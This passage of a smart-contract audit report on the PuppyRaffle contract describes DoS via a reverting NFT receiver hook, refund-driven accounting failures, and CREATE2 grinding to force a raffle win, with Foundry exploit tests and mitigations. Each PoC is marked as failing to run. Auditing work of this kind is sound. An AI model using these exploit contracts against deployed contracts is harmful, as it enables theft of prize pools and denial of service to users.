Do not use block.timestamp or msg.sender in RNG. Replace with a secure source (e.g., Chainlink VRF) or a two-phase commit-reveal using future blockhash. For the end-of-round check, keep block.timestamp for liveness but decouple randomness from it. Example: store a commitment at round close, derive randomness from a later blockhash finalized after close, and let anyone settle using that unbiased seed.





 **Derived From** : safeMint/onERC721Received callback can revert and grief selectWinner

## [M-8]. selectWinner is DoS-able via untrusted ERC721 receiver hook causing perpetual round finalization failures

## Derived From Pattern/Invariant
safeMint/onERC721Received callback can revert and grief selectWinner

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
selectWinner sends ETH to the winner, then calls _safeMint(winner, tokenId). If the winner is a contract, _safeMint triggers onERC721Received on the untrusted recipient. A malicious winner contract can revert in its ERC721 receiver hook (or accept ETH then revert in onERC721Received), causing the entire selectWinner transaction to revert. Because state updates (delete players, raffleStartTime reset, previousWinner) happen before the external calls, they also revert, leaving the round open and enabling repeated grief attempts and gas burning with no progress. Vulnerable snippet:

(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);

## Impact
A malicious contract entered as a player can cause selectWinner to revert consistently when it is selected, by reverting in onERC721Received during the _safeMint. This prevents round finalization, blocks fee withdrawal, and wastes gas for callers. Although any ETH sent to the winner is reverted with the transaction, the raffle remains unfinalized, resulting in a liveness/availability DoS until a non-malicious winner is selected. An attacker can significantly increase the likelihood of being selected by entering many unique addresses controlled by them, making the DoS highly likely.

## Command to Run Test


## Proof of Concept
Attack outline:
- Attacker deploys a contract that accepts ETH but reverts in onERC721Received.
- Attacker enters the raffle with that contract address among the participants (they can also add many unique attacker-controlled addresses to maximize selection probability).
- After the raffle duration elapses, when selectWinner is called and the attacker address is chosen, the ETH transfer succeeds locally but the subsequent _safeMint triggers onERC721Received on the attacker and reverts. The entire transaction reverts, rolling back the ETH transfer and all prior state updates (players clearing, raffleStartTime reset), leaving the round open. Calls to selectWinner can be repeated and will continue to revert whenever the attacker address is selected, causing a persistent availability DoS.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MaliciousWinner {
    // Accept ETH so the push payment does not revert by itself
    receive() external payable {}

    // Revert on ERC721 safe mint callback to grief selectWinner
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        revert("grief: onERC721Received");
    }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle puppy;
    MaliciousWinner mal;

    function setUp() public {
        puppy = new PuppyRaffle(1 ether, address(0xFEEEEE), 1 days);
        mal = new MaliciousWinner();
    }

    function test_selectWinner_DoS_via_onERC721Received_revert() public {
        // Enter with 4 unique players including malicious contract
        address[] memory entrants = new address[](4);
        entrants[0] = address(mal);
        entrants[1] = address(0x1111111111111111111111111111111111111111);
        entrants[2] = address(0x2222222222222222222222222222222222222222);
        entrants[3] = address(0x3333333333333333333333333333333333333333);

        address payer = address(0xAAAA);
        vm.deal(payer, 100 ether);
        vm.prank(payer);
        puppy.enterRaffle{value: puppy.entranceFee() * entrants.length}(entrants);

        // Advance time so raffle can be finalized
        vm.warp(puppy.raffleStartTime() + puppy.raffleDuration());

        // Find a caller and timestamp such that winnerIndex == 0 (malicious contract)
        // We avoid changing block.difficulty to keep the test portable.
        uint256 diff = block.difficulty; // whatever the current value is in the test VM
        uint256 baseT = block.timestamp;

        address chosenCaller = address(0);
        uint256 chosenT = 0;
        bool found = false;

        // Try up to 128 candidate callers and 2048 timestamps – very likely to find a hit quickly
        for (uint256 j = 1; j <= 128 && !found; j++) {
            address candidate = address(uint160(j));
            for (uint256 i = 0; i < 2048 && !found; i++) {
                if (uint256(keccak256(abi.encodePacked(candidate, baseT + i, diff))) % entrants.length == 0) {
                    chosenCaller = candidate;
                    chosenT = baseT + i;
                    found = true;
                }
            }
        }
        require(found, "no satisfying (caller,timestamp) found");

        vm.warp(chosenT);

        uint256 beforeStart = puppy.raffleStartTime();
        address beforeP0 = puppy.players(0);
        address beforePrev = puppy.previousWinner();

        vm.prank(chosenCaller);
        vm.expectRevert();
        puppy.selectWinner();

        // Assert no progress (round still stuck)
        assertEq(puppy.raffleStartTime(), beforeStart);
        assertEq(puppy.players(0), beforeP0);
        assertEq(puppy.previousWinner(), beforePrev);
    }
}


## Suggested Mitigation
Avoid untrusted external callbacks during finalization. Recommended: switch selectWinner to a pull/claim model for both ETH and the NFT: (1) compute and store winner + rarity; (2) reset players and raffleStartTime; (3) increment fees; (4) do not send ETH or mint in the same transaction. Expose claimPrize() and claimNft() functions callable by the recorded winner to pull their ETH and perform a safe mint/transfer; failures in a winner’s callback will not block round progress. If retaining push semantics is desired, do not call _safeMint to the winner in finalize; instead, mint to the protocol contract (or owner) and record the winner so they can later safeTransferFrom to themselves. Alternatively, use _mint instead of _safeMint during finalize, but note that this can send NFTs to contracts that cannot handle ERC721s; if used, document this trade-off and consider a conditional path: for contract winners, mint to the raffle contract and let them claim via safeTransferFrom later. Do not rely on Address.isContract to decide safe vs. unsafe paths, as it is bypassable for contracts in construction.





 **Derived From** : Pot/fee computed from players.length breaks accounting with refunds, causing DoS/misallocation

## [M-9]. selectWinner DoS: prize calculated from players.length exceeds real pot after refunds, making round unfinishable

## Derived From Pattern/Invariant
Pot/fee computed from players.length breaks accounting with refunds, causing DoS/misallocation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
selectWinner derives the pot and fee from players.length and entranceFee, ignoring refunded holes that set players[i] = address(0) without shrinking the array. This breaks the conservation invariant between collected funds and payout accounting. If enough players refund before finalization, the computed prizePool = 80% of players.length * entranceFee exceeds the actual contract balance (equal to active entries * entranceFee), causing the value transfer to revert and permanently DoSing round finalization.

Vulnerable snippet:
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
...
uint256 winnerIndex = uint256(keccak256(...)) % players.length;
address winner = players[winnerIndex];
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");

Because refund() leaves address(0) slots, players.length overestimates actual funds, causing the transfer to exceed balance and revert.

## Impact
Functional DoS: Any EOA can make prizePool > balance by refunding enough entries, so selectWinner always reverts and the raffle cannot finalize.

## Command to Run Test


## Proof of Concept
- Attacker funds 4 unique addresses into the raffle (players.length = 4).
- Two of those addresses call refund(), creating holes: players = [0x0, 0x0, p2, p3], balance = 2 * entranceFee.
- After duration, attacker calls selectWinner(). Contract computes prizePool = 80% of (4 * entranceFee) = 3.2 * entranceFee, which exceeds balance (2 * entranceFee) so the value transfer reverts.
- Round is stuck; any selectWinner call will continue to revert unless someone subsidizes the shortfall and the hole ratio drops below 20%. Attacker can keep refunding to maintain the DoS.

## Proof of Code
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

// Harness to satisfy totalSupply() used in selectWinner()
contract PuppyRaffleHarness is PuppyRaffle {
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration)
        PuppyRaffle(_entranceFee, _feeAddress, _raffleDuration)
    {}
    function totalSupply() public view returns (uint256) {
        return 0;
    }
}

contract AccountingInvariantViolation_DoS_Test is Test {
    PuppyRaffleHarness raff;
    uint256 constant ENTRANCE = 1 ether;

    function setUp() public {
        raff = new PuppyRaffleHarness(ENTRANCE, address(0xFEE), 1 days);
    }

    function test_DoS_selectWinner_RevertsWhenRefundsOverestimatePot() public {
        address[] memory addrs = new address[](4);
        addrs[0] = address(0x1);
        addrs[1] = address(0x2);
        addrs[2] = address(0x3);
        addrs[3] = address(0x4);

        // Optional: give participants gas balance
        vm.deal(addrs[0], 1 ether);
        vm.deal(addrs[1], 1 ether);
        vm.deal(addrs[2], 1 ether);
        vm.deal(addrs[3], 1 ether);

        // Enter 4 players at once
        address funder = address(0xBEEF);
        vm.deal(funder, ENTRANCE * addrs.length);
        vm.prank(funder);
        raff.enterRaffle{value: ENTRANCE * addrs.length}(addrs);

        // Two refunds -> holes remain, balance = 2 * ENTRANCE while players.length == 4
        vm.prank(addrs[0]);
        raff.refund(0);
        vm.prank(addrs[1]);
        raff.refund(1);
        assertEq(address(raff).balance, 2 * ENTRANCE);

        // After duration, prize is computed off players.length (3.2 ETH) > balance (2 ETH) => send fails => revert
        vm.warp(raff.raffleStartTime() + raff.raffleDuration() + 1);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raff.selectWinner();
    }
}


## Suggested Mitigation
- Compute prize and fee from the real round pot, not players.length:
  - uint256 roundPot = address(this).balance - uint256(totalFees);
  - uint256 prizePool = (roundPot * 80) / 100;
  - uint256 fee = roundPot - prizePool;
- Track and use active players only:
  - Maintain an activeCount incremented on enter and decremented on refund, and require(activeCount >= 4).
  - Either compact the players array on refund using swap-and-pop (and let users discover their current index via getActivePlayerIndex), or maintain an index mapping and a dense active list to pick a winner from [0, activeCount).
- Ensure winner is always a non-zero address by drawing from the active set; avoid selecting among zeroed slots.
- Optionally, perform state updates only after successful prize transfer to reduce side effects on failure (although require(success) already reverts state).


## [M-10]. Fee accounting drift: totalFees over-accrues vs real balance when refunds occur, bricking withdrawFees

## Derived From Pattern/Invariant
Pot/fee computed from players.length breaks accounting with refunds, causing DoS/misallocation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
When some players refund but not enough to make prize exceed balance (holes <= 20%), selectWinner succeeds but still computes fee = 20% of players.length * entranceFee. The actual leftover balance after sending prize equals (activeCount - 0.8 * players.length) * entranceFee, which is smaller by (refundedCount * entranceFee). Thus totalFees > address(this).balance post-payout, violating the accounting invariant and permanently failing withdrawFees() which requires equality. Fees become stuck until someone subsidizes the contract to exactly match totalFees.

Vulnerable snippet:
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); // withdrawFees

## Impact
Protocol fee withdrawal DoS: totalFees overstates available fees, making withdrawFees() revert indefinitely; owner cannot withdraw accrued fees without third-party subsidy.

## Command to Run Test


## Proof of Concept
- 5 distinct players enter (players.length = 5, balance = 5 * fee).
- 1 player refunds (holes = 1, active = 4). Balance = 4 * fee.
- After duration, call selectWinner(). Prize = 80% of (5*fee) = 4*fee, transfer succeeds. totalFees increases by 1*fee.
- Post-payout: balance = 0, totalFees = 1*fee. withdrawFees requires balance == totalFees and thus reverts; fees are stuck.
- Attacker can repeat this each round to keep fee withdrawal bricked.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract FeeAccountingDriftTest is Test {
    PuppyRaffle raff;
    uint256 constant ENTRANCE = 1 ether;

    function setUp() public {
        raff = new PuppyRaffle(ENTRANCE, address(0xFEE), 1 days);
    }

    function test_withdrawFeesBrickedWhenRefundsUnder20Percent() public {
        uint256 len = 5;
        address[] memory addrs = new address[](len);
        for (uint256 i; i < len; i++) {
            addrs[i] = address(uint160(i + 1));
        }

        // Enter 5 players via a single funder
        address funder = address(0xBEEF);
        vm.deal(funder, ENTRANCE * len);
        vm.prank(funder);
        raff.enterRaffle{value: ENTRANCE * len}(addrs);

        // One refund -> holes = 1 (< 20%), balance becomes 4 * ENTRANCE
        vm.prank(addrs[0]);
        raff.refund(0);
        assertEq(address(raff).balance, 4 * ENTRANCE);

        // Advance time to allow selecting winner
        vm.warp(raff.raffleStartTime() + raff.raffleDuration() + 1);

        // Choose a caller so winnerIndex != 0 (avoid zero-address winner)
        uint256 widx;
        address caller;
        for (uint160 s = 100; s < 1000; s++) {
            caller = address(s);
            widx = uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % len;
            if (widx != 0) break;
        }
        require(widx != 0, "no valid caller found");

        // selectWinner succeeds: prize = 80% of (5 * ENTRANCE) = 4 * ENTRANCE
        vm.prank(caller);
        raff.selectWinner();

        // Over-accrued fees: balance is 0 but totalFees is 1 ETH
        assertEq(address(raff).balance, 0);
        assertEq(uint256(raff.totalFees()), ENTRANCE);

        // withdrawFees is bricked since balance != totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raff.withdrawFees();
    }
}


## Suggested Mitigation
Fix fee accrual to use actual available pot and decouple withdrawal from players[]. 1) In selectWinner(): compute pot as roundPot = address(this).balance - uint256(totalFees); then prize = (roundPot * 80) / 100; fee = roundPot - prize; accrue totalFees += fee. This ensures prize never exceeds available funds and fees match leftover. 2) Ensure winner is an active address: maintain a compact active players list (swap-and-pop on refund) and select modulo activeCount; or skip zero slots deterministically. 3) In withdrawFees(): remove the balance equality gate; just transfer totalFees to feeAddress, e.g. require(totalFees > 0); uint256 amt = totalFees; totalFees = 0; (bool ok,) = feeAddress.call{value: amt}(""); require(ok, "PuppyRaffle: Failed to withdraw fees"); This makes fee withdrawal independent of current round balance while (1) prevents mixing fees with pot.





 **Derived From** : Predictable PRNG uses timestamp/difficulty and caller; winner/rarity biasable

## [H-11]. CREATE2 address grinding lets attacker deterministically win PuppyRaffle.selectWinner and siphon 80% of pot

## Derived From Pattern/Invariant
Predictable PRNG uses timestamp/difficulty and caller; winner/rarity biasable

## Exploit Type
Randomness

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
selectWinner derives its seed from fully manipulable fields, most critically msg.sender:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

Because the caller controls msg.sender, an attacker can grind msg.sender via CREATE2 inside a single transaction, using the actual block.timestamp and block.difficulty, to find a caller address that maps to any desired winnerIndex. They then deploy that address and invoke selectWinner from it, forcing the contract to pick the attacker’s desired index (owned by the attacker) and win the pot. The same grind can be extended to bias NFT rarity.

Key points:
- The hash uses only current block params and msg.sender; within one tx these are constant and known to the attacker’s contract.
- Using CREATE2, the attacker can precompute candidate contract addresses for different salts and test which address yields their target index modulo players.length.
- After finding a matching address, the attacker deploys it and calls selectWinner in the same tx, guaranteeing the chosen index wins and capturing 80% of the pool. This is permissionless and repeatable every round.

## Impact
Attacker can always choose the winning index and steal 80% of the prize pool each round. They can also bias NFT rarity to farm legendaries, degrading game integrity and value.

## Command to Run Test


## Proof of Concept
1) Attacker enters the raffle with at least one controlled address (or multiple) among players.
2) After raffle end, attacker sends a tx to a Grinder contract.
3) Grinder computes the CREATE2 address for many salts and checks, for each candidate address A, whether keccak256(A, block.timestamp, block.difficulty) % playersLen == targetIndex controlled by attacker.
4) On match, Grinder deploys that contract with CREATE2 and has it call selectWinner immediately. Because msg.sender is the crafted address, winnerIndex equals the attacker’s target index. The winner (attacker-controlled) gets 80% of the pot.
5) Optionally, grind until rarity mapping also yields ‘legendary’ to farm rare NFTs.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol"; // Contract is 0.7.6; Foundry supports multi-solc

contract ForceWinCreate2Test is Test {
    PuppyRaffle raffle;
    Grinder grinder;

    address feeAddr = address(0xFEE);
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address victim1 = address(0xA1);
    address victim2 = address(0xA2);
    address victim3 = address(0xA3);
    address attackerPlayer = address(0xBEEF02); // attacker-controlled player index we target
    address payer = address(0xBEEF01);          // pays entrance fees

    function setUp() public {
        raffle = new PuppyRaffle(FEE, feeAddr, DURATION);
        grinder = new Grinder();

        vm.deal(payer, 10 ether);

        // Enter 4 players: [victim1, victim2, attackerPlayer, victim3]
        address[] memory arr = new address[](4);
        arr[0] = victim1;
        arr[1] = victim2;
        arr[2] = attackerPlayer;
        arr[3] = victim3;

        vm.prank(payer);
        raffle.enterRaffle{value: FEE * 4}(arr);

        // Raffle must be over
        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_Create2GrindingForcesWinner() public {
        uint256 playersLen = 4;
        uint256 targetIndex = 2; // attacker-controlled index

        uint256 balBefore = attackerPlayer.balance;

        grinder.grindAndSelectWinner(address(raffle), targetIndex, playersLen);

        assertEq(raffle.previousWinner(), attackerPlayer, "forced winner mismatch");

        uint256 pot = playersLen * FEE;
        uint256 prize = (pot * 80) / 100;
        assertEq(attackerPlayer.balance, balBefore + prize, "prize not received");
    }
}

contract Caller {
    function select(address raffle) external {
        PuppyRaffle(raffle).selectWinner();
    }
}

contract Grinder {
    function grindAndSelectWinner(address raffle, uint256 targetIndex, uint256 playersLen) external {
        bytes memory init = type(Caller).creationCode; // no constructor args
        bytes32 initHash = keccak256(init);

        // A modest cap is sufficient; expected hits ~4 iterations for 4 players
        for (uint256 s = 0; s < 4096; s++) {
            bytes32 salt = bytes32(s);
            address candidate = _computeCreate2Address(salt, address(this), initHash);

            uint256 idx = uint256(keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))) % playersLen;
            if (idx == targetIndex) {
                address deployed;
                assembly {
                    let encoded := add(init, 0x20)
                    let size := mload(init)
                    deployed := create2(0, encoded, size, salt)
                }
                require(deployed != address(0), "CREATE2 failed");
                Caller(deployed).select(raffle);
                return;
            }
        }
        revert("no match found in cap");
    }

    function _computeCreate2Address(bytes32 salt, address deployer, bytes32 initCodeHash) internal pure returns (address) {
        bytes32 digest = keccak256(abi.encodePacked(bytes1(0xff), deployer, salt, initCodeHash));
        return address(uint160(uint256(digest)));
    }
}

## Suggested Mitigation
Do not derive randomness from manipulable inputs like msg.sender, block.timestamp, or block.difficulty/prevrandao available in the same transaction. Use a secure randomness source such as Chainlink VRF. If an oracle is not desired, implement a two-phase commit–reveal: participants (or the protocol) commit a secret, and the reveal occurs in a later block, combining the secret with a future block’s prevrandao/blockhash so it cannot be ground within a single transaction. Ensure the caller of selectWinner does not influence the seed at all. Simply removing msg.sender from the seed is insufficient if the rest of the entropy remains miner/validator or same-block predictable.



